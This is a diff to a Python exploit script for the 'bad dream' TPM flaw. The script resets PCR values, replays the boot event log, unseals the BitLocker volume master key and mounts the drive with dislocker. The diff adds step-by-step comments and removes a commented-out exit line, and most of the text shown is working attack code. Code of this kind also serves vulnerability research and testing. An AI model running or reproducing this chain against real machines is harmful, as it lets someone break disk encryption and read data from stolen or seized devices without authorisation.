@@ -278,6 +278,7 @@ def unseal(drive):
 
     color_print("The BitLocker volume is opened in /mnt/dislocker\n", GREEN)
 
+# Check what the current PCR values are
 output = get_pcrs()
 
 hash = next(iter(output))
@@ -290,8 +291,10 @@ if 0 not in output[hash]:
 if output[hash][0] == 0:
     color_print("PCR 0 was already zero.  Are you sure secure boot is enabled?\n", FAIL)
 
+# Use the bad dream vulnerability to reset PCRs
 reset_pcrs()
 
+# Get the new PCR values
 newoutput = get_pcrs()
 
 if False:
@@ -303,6 +306,7 @@ if False:
 
 zero = False
 
+# Which PCRs changed?
 for pcr in output[hash].keys():
     old = output[hash][pcr]
     new = newoutput[hash][pcr]
@@ -315,11 +319,12 @@ for pcr in output[hash].keys():
 if not zero:
     color_print("Machine does not appear to be vulnerable\n", FAIL)
 
+# Replay event log to reset PCRs
 info_print("Replaying event log...\n")
 log = parse_event_log()
 #print(log)
 replay_event_log(log)
 #subprocess.check_output("tpm2_pcrread sha256:7", shell=True)
-#sys.exit(1)
 
+# Unseal the VMK key
 unseal(get_drive_path())
